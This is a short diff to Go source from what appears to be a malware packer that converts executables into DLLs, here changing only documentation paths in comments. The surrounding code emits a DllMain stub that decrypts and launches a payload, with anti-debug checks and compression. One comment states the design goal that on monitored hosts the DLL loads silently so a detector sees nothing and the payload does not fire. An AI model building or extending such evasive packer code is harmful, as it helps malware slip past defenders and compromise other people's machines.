@@ -87,7 +87,7 @@ var ErrConvertedDLLPlanMissing = errors.New("stage1: EmitConvertedDLLStub requir
 // On reasons other than PROCESS_ATTACH (THREAD_*, PROCESS_DETACH),
 // the stub returns TRUE immediately without decrypting or spawning.
 //
-// Slice 5.3 of docs/refactor-2026-doc/packer-exe-to-dll-plan.md.
+// Slice 5.3 of .dev/refactor-2026/packer-exe-to-dll-plan.md.
 func EmitConvertedDLLStub(b *amd64.Builder, plan transform.Plan, rounds []poly.Round, opts EmitOptions) error {
 	if !plan.IsConvertedDLL {
 		return ErrConvertedDLLPlanMissing
@@ -104,7 +104,7 @@ func EmitConvertedDLLStub(b *amd64.Builder, plan transform.Plan, rounds []poly.R
 	// RAX as BOOL TRUE → DllMain "succeeded" → DLL loads silently
 	// without ever decrypting or spawning. Detector sees nothing
 	// suspicious; payload simply doesn't fire on monitored hosts.
-	// Slice 5.6 of docs/refactor-2026-doc/packer-exe-to-dll-plan.md.
+	// Slice 5.6 of .dev/refactor-2026/packer-exe-to-dll-plan.md.
 	if opts.AntiDebug {
 		if err := emitAntiDebug(b, plan.Format); err != nil {
 			return fmt.Errorf("stage1/converted: antidebug: %w", err)
@@ -177,7 +177,7 @@ func EmitConvertedDLLStub(b *amd64.Builder, plan transform.Plan, rounds []poly.R
 		// back to R15. EmitLZ4InflateInline internally preserves
 		// RBX/R12; RSI/RDI used by the memcpy are spilled by the
 		// converted-DLL prologue. Slice 5.7 of
-		// docs/refactor-2026-doc/packer-exe-to-dll-plan.md.
+		// .dev/refactor-2026/packer-exe-to-dll-plan.md.
 		if opts.Compress {
 			if err := emitLZ4DecompressBlock(b, opts, "stage1/converted: EmitConvertedDLLStub"); err != nil {
 				return err
